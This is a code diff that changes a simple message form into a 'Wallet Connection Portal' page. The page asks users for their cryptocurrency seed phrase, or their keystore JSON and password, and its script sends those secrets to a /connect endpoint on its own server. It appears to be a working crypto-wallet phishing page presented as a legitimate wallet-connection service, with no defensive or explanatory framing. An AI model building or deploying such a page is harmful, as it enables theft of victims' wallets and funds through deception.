@@ -1,13 +1,237 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Send Message</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connection Portal</title>
+    <style>
+        :root {
+            --primary-color: #6366f1;
+            --background-dark: #1a1b1e;
+            --card-background: #242529;
+            --text-light: #f8fafc;
+            --dropdown-bg: #111827;
+        }
+
+        body {
+            background-color: var(--background-dark);
+            color: var(--text-light);
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0;
+            padding: 2rem;
+            min-height: 100vh;
+        }
+
+        .form-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .form-card {
+            background: var(--card-background);
+            border-radius: 1rem;
+            padding: 2rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            font-size: 1.5rem;
+        }
+
+        .dropdown-container {
+            position: relative;
+            margin-bottom: 1rem;
+        }
+
+        .dropdown-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: #94a3b8;
+        }
+
+        .dropdown-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0.8rem;
+            background: var(--dropdown-bg);
+            border: 1px solid #374151;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .dropdown-header:hover {
+            border-color: var(--primary-color);
+        }
+
+        .dropdown-header::after {
+            content: "▼";
+            font-size: 0.8rem;
+            color: var(--primary-color);
+            transition: transform 0.3s ease;
+        }
+
+        .dropdown-header.active::after {
+            transform: rotate(180deg);
+        }
+
+        .dropdown-content {
+            display: none;
+            padding: 1rem;
+            background: var(--dropdown-bg);
+            border: 1px solid #374151;
+            border-top: none;
+            border-radius: 0 0 0.5rem 0.5rem;
+            margin-top: -0.5rem;
+        }
+
+        .dropdown-content.active {
+            display: block;
+        }
+
+        textarea, input {
+            width: 95%;
+            padding: 0.8rem;
+            border: 1px solid #374151;
+            border-radius: 0.5rem;
+            background: #1e293b;
+            color: var(--text-light);
+            font-size: 1rem;
+            resize: none;
+            min-height: 100px;
+            margin-bottom: 1rem;
+        }
+
+        textarea:focus, input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+        }
+
+        .connect-btn {
+            background: var(--primary-color);
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border: none;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            font-weight: 600;
+            width: 100%;
+            transition: opacity 0.3s ease;
+        }
+
+        .connect-btn:hover {
+            opacity: 0.9;
+        }
+
+        @media (max-width: 768px) {
+            .form-container {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
 </head>
 <body>
-    <h2>Send a Message</h2>
-    <form method="POST">
-        <textarea name="message" placeholder="Type your message here..." rows="5" cols="40"></textarea><br><br>
-        <button type="submit">Connect</button>
-    </form>
+    <div class="form-container">
+        <!-- Seed Phrase Form -->
+        <div class="form-card">
+            <h2>Seed Phrase</h2>
+            <div class="dropdown-container">
+                <label class="dropdown-label">Typically 12 (sometimes 24) words separated by single spaces</label>
+                <div class="dropdown-header" onclick="toggleDropdown(this)">
+                    <span>Enter Seed Phrase</span>
+                </div>
+                <div class="dropdown-content">
+                    <form id="seed-form" onsubmit="submitForm(event, 'seed')">
+                        <textarea name="message" placeholder="Enter your seed phrase here..." required></textarea>
+                        <button type="submit" class="connect-btn">Connect</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+        <!-- Keystore JSON Form -->
+        <div class="form-card">
+            <h2>Keystore Json</h2>
+            <div class="dropdown-container">
+                <label class="dropdown-label">Several lines of text beginning with "{...}" plus the password</label>
+                <div class="dropdown-header" onclick="toggleDropdown(this)">
+                    <span>Enter Keystore JSON</span>
+                </div>
+                <div class="dropdown-content">
+                    <form id="keystore-form" onsubmit="submitForm(event, 'keystore')">
+                        <textarea name="keystore" placeholder="Paste your keystore JSON here..." required></textarea>
+                        <input type="password" name="password" placeholder="Enter your password" required>
+                        <button type="submit" class="connect-btn">Connect</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Toggle dropdown visibility
+        function toggleDropdown(header) {
+            header.classList.toggle('active');
+            const content = header.nextElementSibling;
+            content.classList.toggle('active');
+        }
+
+        // Submit form to /connect endpoint
+        async function submitForm(event, formType) {
+            event.preventDefault();
+            const form = event.target;
+            const formData = new FormData(form);
+            const submitBtn = form.querySelector('.connect-btn');
+
+            // Disable button during submission
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Connecting...';
+
+            try {
+                // Format the message according to form type
+                let message;
+                if (formType === 'seed') {
+                    message = `Seed Phrase: ${formData.get('message')}`;
+                } else {
+                    message = `Keystore JSON: ${formData.get('keystore')}\nPassword: ${formData.get('password')}`;
+                }
+
+                const response = await fetch('/connect', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `message=${encodeURIComponent(message)}`
+                });
+
+                const result = await response.text();
+                alert(result);
+                form.reset();
+            } catch (error) {
+                console.error('Connection error:', error);
+                alert(`Error: ${error.message}`);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Connect';
+            }
+        }
+
+        // Close dropdowns when clicking outside
+        document.addEventListener('click', function(event) {
+            if (!event.target.closest('.dropdown-container')) {
+                document.querySelectorAll('.dropdown-header').forEach(header => {
+                    header.classList.remove('active');
+                    header.nextElementSibling.classList.remove('active');
+                });
+            }
+        });
+    </script>
 </body>
 </html>
